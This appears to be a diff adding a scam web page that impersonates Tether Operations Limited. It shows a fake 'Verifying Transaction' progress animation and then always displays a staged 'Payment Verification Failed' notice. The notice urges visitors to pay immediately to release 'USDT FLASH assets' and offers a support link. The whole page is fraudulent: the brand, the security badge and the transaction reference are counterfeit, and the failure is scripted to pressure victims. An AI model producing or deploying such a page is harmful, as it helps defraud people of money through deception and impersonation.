@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verifying Transaction... | Tether Operations Limited</title>
+    <link rel="icon" type="image/png" href="../2026/de3f711b-0d22-4488-ba49-36e489bfec7e.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        tether: '#26A17B',
+                        tetherDark: '#1A8462',
+                        tetherLight: '#53C1A0',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body { font-family: 'Inter', sans-serif; }
+        .loader {
+            border-top-color: #26A17B;
+            -webkit-animation: spinner 1.5s linear infinite;
+            animation: spinner 1.5s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes spinner {
+            0% { -webkit-transform: rotate(0deg); }
+            100% { -webkit-transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen flex flex-col items-center justify-center p-4 relative">
+    
+    <!-- Corporate Header Background -->
+    <div class="absolute top-0 left-0 w-full h-64 bg-[#1A2E1A] shadow-lg z-0 border-b-4 border-[#26A17B]"></div>
+
+    <!-- Main Content Card -->
+    <div class="relative z-10 w-full max-w-md bg-white rounded-xl shadow-2xl overflow-hidden border border-gray-100">
+        
+        <!-- Processing View -->
+        <div id="processingModal" class="p-8 flex flex-col items-center text-center">
+            <div class="mb-8 relative">
+                <div class="loader ease-linear rounded-full border-4 border-gray-200 h-20 w-20"></div>
+                <div class="absolute top-0 left-0 h-20 w-20 flex items-center justify-center">
+                    <img src="../2026/de3f711b-0d22-4488-ba49-36e489bfec7e.png" alt="Logo" class="h-16 w-16 object-contain">
+                </div>
+            </div>
+            
+            <h2 class="text-2xl font-bold text-gray-800 mb-2">Verifying Transaction</h2>
+            <p class="text-gray-500 text-sm mb-8">Connecting to Tether Blockchain Network...</p>
+            
+            <div class="w-full bg-gray-100 rounded-full h-2.5 mb-2 overflow-hidden">
+                <div id="progressBar" class="bg-[#26A17B] h-2.5 rounded-full transition-all duration-300 ease-out" style="width: 0%"></div>
+            </div>
+            <div class="flex justify-between w-full text-xs text-gray-400 mt-1">
+                <span>Syncing Nodes...</span>
+                <span id="progressText">0%</span>
+            </div>
+            
+            <div class="mt-8 flex items-center justify-center space-x-2 text-xs text-gray-400 bg-gray-50 py-2 px-4 rounded-full">
+                <i class="fas fa-shield-alt text-[#26A17B]"></i>
+                <span>256-bit SSL Secure Connection</span>
+            </div>
+        </div>
+
+        <!-- Failed/Action Required View -->
+        <div id="failedModal" class="hidden">
+            <div class="bg-red-50 p-6 flex flex-col items-center justify-center border-b border-red-100">
+                <div class="h-16 w-16 bg-red-100 rounded-full flex items-center justify-center mb-4 shadow-inner">
+                    <i class="fas fa-exclamation-triangle text-red-600 text-2xl"></i>
+                </div>
+                <h2 class="text-xl font-bold text-gray-800">Payment Verification Failed</h2>
+                <p class="text-red-600 text-sm font-medium mt-1">Transaction Not Completed</p>
+            </div>
+            
+            <div class="p-6">
+                <div class="bg-white border border-gray-200 rounded-lg p-4 mb-6 shadow-sm">
+                    <p class="text-gray-600 text-sm leading-relaxed mb-3">
+                        Tether security protocols have detected that the payment was not completed. You must complete the payment to receive your USDT FLASH assets.
+                    </p>
+                    <div class="flex items-start space-x-3 bg-red-50 p-3 rounded border border-red-100">
+                        <i class="fas fa-shield-alt text-red-500 mt-0.5"></i>
+                        <p class="text-xs text-red-700">
+                            <strong>Official Notice:</strong> You must complete the payment immediately to release your USDT FLASH assets.
+                        </p>
+                    </div>
+                </div>
+
+                <div class="space-y-3">
+                    <button onclick="contactSupport()" class="w-full bg-[#26A17B] hover:bg-[#1A8462] text-white font-semibold py-3 px-4 rounded-lg shadow-md transition duration-200 flex items-center justify-center group">
+                        <i class="fas fa-headset mr-2 group-hover:animate-bounce"></i> Contact Support
+                    </button>
+                    
+                    <div class="grid grid-cols-2 gap-3">
+                        <button onclick="retryPayment()" class="w-full bg-white border border-gray-300 text-gray-700 hover:bg-gray-50 font-medium py-2.5 px-4 rounded-lg transition duration-200 text-sm">
+                            Try Again
+                        </button>
+                        <button onclick="goBack()" class="w-full bg-white border border-gray-300 text-gray-700 hover:bg-gray-50 font-medium py-2.5 px-4 rounded-lg transition duration-200 text-sm">
+                            Cancel
+                        </button>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="bg-gray-50 px-6 py-3 border-t border-gray-100 flex justify-between items-center">
+                <span class="text-xs text-gray-500">Ref: <span class="font-mono">TETHER-VERIFY-8472</span></span>
+                <span class="text-xs text-gray-400 flex items-center"><i class="fas fa-clock mr-1"></i> <span id="transactionTime">Just now</span></span>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Footer Info -->
+    <div class="mt-8 text-center z-10">
+        <p class="text-gray-400 text-xs">&copy; 2026 Tether Operations Limited. All rights reserved.</p>
+        <div class="flex justify-center space-x-4 mt-2">
+            <i class="fab fa-cc-visa text-gray-400 text-xl opacity-50"></i>
+            <i class="fab fa-cc-mastercard text-gray-400 text-xl opacity-50"></i>
+            <i class="fab fa-bitcoin text-gray-400 text-xl opacity-50"></i>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const processingModal = document.getElementById('processingModal');
+            const failedModal = document.getElementById('failedModal');
+            const progressBar = document.getElementById('progressBar');
+            const progressText = document.getElementById('progressText');
+            
+            // Set current time
+            const timeElement = document.getElementById('transactionTime');
+            if (timeElement) {
+                timeElement.innerText = new Date().toLocaleString();
+            }
+            
+            // Animate Tab Title
+            let titleDots = 0;
+            setInterval(() => {
+                titleDots = (titleDots + 1) % 4;
+                document.title = `Verifying Transaction${'.'.repeat(titleDots)} | Tether Operations Limited`;
+            }, 500);
+            
+            // Start processing animation
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                // Non-linear progress for realism
+                if(progress < 30) progress += Math.random() * 2;
+                else if(progress < 80) progress += Math.random() * 2;
+                else progress += Math.random() * 0.5;
+                
+                if (progress > 100) progress = 100; // Cap at 100%
+                
+                const currentProgress = Math.min(Math.round(progress), 100);
+                progressBar.style.width = currentProgress + '%';
+                if(progressText) progressText.innerText = currentProgress + '%';
+            }, 100);
+            
+            // Show failed/action message after 8 seconds
+            setTimeout(() => {
+                clearInterval(progressInterval);
+                // Ensure 100% is shown
+                progressBar.style.width = '100%';
+                if(progressText) progressText.innerText = '100%';
+                
+                // Fade out processing
+                processingModal.style.opacity = '0';
+                processingModal.style.transition = 'opacity 0.5s ease';
+                
+                setTimeout(() => {
+                    processingModal.classList.add('hidden');
+                    failedModal.classList.remove('hidden');
+                    // Fade in failed
+                    failedModal.style.opacity = '0';
+                    failedModal.classList.remove('hidden');
+                    requestAnimationFrame(() => {
+                        failedModal.style.transition = 'opacity 0.5s ease';
+                        failedModal.style.opacity = '1';
+                    });
+                }, 500);
+            }, 8000);
+        });
+        
+        function contactSupport() {
+            window.open('support.html', '_blank');
+        }
+        
+        function retryPayment() {
+            window.location.reload();
+        }
+        
+        function goBack() {
+            window.location.href = 'account-info.html';
+        }
+    </script>
+</body>
+</html>
